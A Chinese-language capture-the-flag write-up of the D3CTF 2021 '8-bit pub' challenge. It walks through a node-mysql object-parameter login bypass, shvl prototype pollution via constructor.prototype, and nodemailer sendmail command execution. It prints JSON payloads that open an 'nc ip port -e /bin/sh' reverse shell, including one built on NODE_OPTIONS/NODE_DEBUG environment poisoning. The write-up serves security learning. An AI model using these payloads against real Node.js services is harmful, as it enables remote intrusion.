# 8-bit pub

## 题目简述

本题是 Node.js Web 题，第一步利用 `node-mysql` 参数对象展开特性绕过管理员登录，第二步利用 `shvl` 的原型链污染进入 `nodemailer`，最终通过 sendmail 参数或环境变量污染实现 RCE。

题目附件是 Node.js + MySQL 的 Web 应用，包含登录逻辑、`shvl` 深层属性赋值和 `nodemailer` 发邮件功能。登录绕过的关键 payload 是让 `password` 参数成为对象，使 SQL 变成 `password = password = true`；RCE 的关键是污染 `Object.args/sendmail/path` 或 `Object.env/shell`。

## 解题过程

题目源码见 [`crumbledwall/CTFChallenges/D3CTF2021/8-bit_pub`](https://github.com/crumbledwall/CTFChallenges/tree/main/D3CTF2021/8-bit_pub)。下文保留了源码中的 `node-mysql` 参数展开、`shvl` 原型链污染和 `nodemailer` RCE 两条路径。

### 登录管理员

通过简单审计可知，要登录管理员端，用户名需要为 `admin`。继续定位数据库操作代码。

这里的查询语句使用占位符写法，无法直接做字符串注入。但是阅读 `node-mysql` 文档后可以发现，当传入变量为 Object 时，参数会被转换成 `` `key` = value `` 的格式拼入 SQL。
因此可以把 `password` 构造成对象：

```json
{
  "username": "admin",
  "password": {
    "password": true
  }
}
```

只要对象 key 是表中的 `password` 列，SQL 条件就会被展开成类似 ``password = `password` = true`` 的形式，相当于让密码条件恒真，从而进入管理员功能。

### 原型链污染

登录管理员后可以使用发邮件功能。审计发邮件处的代码时，关键点是服务端用 `shvl` 按用户传入的路径做深层属性赋值。

`shvl` 早期版本存在原型链污染问题。题目使用的版本虽然过滤了 `__proto__`，但修复不完整，仍可以通过 `constructor.prototype` 写到 `Object.prototype` 上。于是请求体中的键名可以影响后续普通对象的默认属性，例如：

```json
{
  "constructor.prototype.sendmail": true
}
```

### Nodemailer RCE

后续命令执行依赖 `nodemailer`。当 `sendmail` 分支被启用时，`nodemailer` 不再只走 SMTP，而是调用本地 sendmail 程序；调用参数会从 transport/options 对象中读取。由于这些对象会继承 `Object.prototype`，前面的原型链污染可以影响 `sendmail`、`path`、`args` 等字段。

第一种做法是直接控制 `args` 和 `path`。把 `path` 改成 `/bin/sh`，把 `args` 改成 `["-c", "<cmd>"]`，再把 `sendmail` 置为 `true`，即可让邮件发送流程变成执行 shell 命令：

```json
{
  "constructor.prototype.path": "/bin/sh",
  "constructor.prototype.args": [
    "-c",
    "nc ip port -e /bin/sh"
  ],
  "constructor.prototype.sendmail": true
}
```

另一种出网受限时的做法是不反弹 shell，而是把 `/readflag` 的输出结果写到 `/tmp`，再用邮件附件带出，形如：

```json
{
  "to": "i@example.com",
  "subject": "flag",
  "attachments": [
    {
      "filename": "flag.txt",
      "path": "/tmp/xxxx"
    }
  ]
}
```

第二种做法是环境变量污染。Node 在 `child_process` 创建子进程时会把 `env` 和 `shell` 等 option 透传给底层进程创建逻辑，如果应用把这些 option 从普通对象合并而来，原型链污染就能影响子进程环境。Node 的 [`child_process.js`](https://github.com/nodejs/node/blob/master/lib/child_process.js#L502) 中会组合这些 option 再启动 shell；[Abusing Environment Variables](https://blog.p6.is/Abusing-Environment-Variables/) 的关键点是利用 `NODE_OPTIONS=-r /proc/self/environ` 让 Node 启动时加载环境变量内容，再通过 `NODE_DEBUG` 中的 JavaScript 片段执行命令。本题中同时污染 `shell` 和 `env` 即可复用该思路：

```json
{
  "constructor.prototype.env": {
    "NODE_DEBUG": "require('child_process').execSync('nc ip port -e /bin/sh')//",
    "NODE_OPTIONS": "-r /proc/self/environ"
  },
  "constructor.prototype.sendmail": true,
  "constructor.prototype.shell": "/bin/node"
}
```

## 方法总结

- 核心技巧：Node 生态链式利用，从 `node-mysql` 对象参数语义到 `shvl` 原型链污染，再到 `nodemailer` 调用 sendmail/child_process 的命令执行面。
- 识别信号：SQL 使用占位符但参数未限制类型，深层属性赋值库只过滤 `__proto__`，邮件功能依赖 `nodemailer` 并可进入 sendmail 分支。
- 复用要点：Node SQL 注入不只看字符串拼接，还要看库对 Object 参数的序列化；原型链污染修复如果只拦 `__proto__`，仍要测试 `constructor.prototype`。

